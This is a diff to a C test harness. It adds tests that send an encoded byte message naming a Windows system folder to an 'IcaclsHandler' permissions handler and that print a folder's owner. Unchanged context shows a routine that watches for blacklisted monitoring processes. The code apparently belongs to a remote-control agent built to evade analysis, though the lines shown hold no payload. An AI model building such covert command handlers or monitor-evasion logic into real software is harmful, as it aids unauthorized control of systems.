@@ -1406,6 +1406,22 @@ void test81() {
 	}
 }
 
+void test82() {
+	BYTE Data[] = { 10, 19, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 48, 52, 53, 53, 97, 56, 49, 102, 45, 101, 102, 102, 101, 45, 52, 56, 100, 97, 45, 57, 102, 99, 99, 45, 99, 51, 51, 102, 56, 97, 54, 52, 56, 100, 101, 97 };
+	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pEnvelope = ALLOC(sizeof(ENVELOPE));
+	pEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pEnvelope->pData->pBuffer = Data;
+	pEnvelope->pData->cbBuffer = sizeof(Data);
+	pRespEnvelope = IcaclsHandler(pEnvelope);
+	FreeEnvelope(pRespEnvelope);
+}
+void test83() {
+	LPSTR lpOwner = GetFileOwner(L"C:\\Users\\Admin\\Desktop");
+	printf("%s\n", lpOwner);
+	FREE(lpOwner);
+}
+
 VOID DetectMonitorSystem() {
 	while (TRUE) {
 		if (CheckForBlackListProcess()) {
@@ -1507,7 +1523,7 @@ int main() {
 	//test59();
 	//test60();
 	//test61();
-	test62();
+	//test62();
 	//test64();
 	//test65();
 	//test66();
@@ -1526,5 +1542,7 @@ int main() {
 	//test79();
 	//test80();
 	//test81();
+	//test82();
+	test83();
 	return 0;
 }
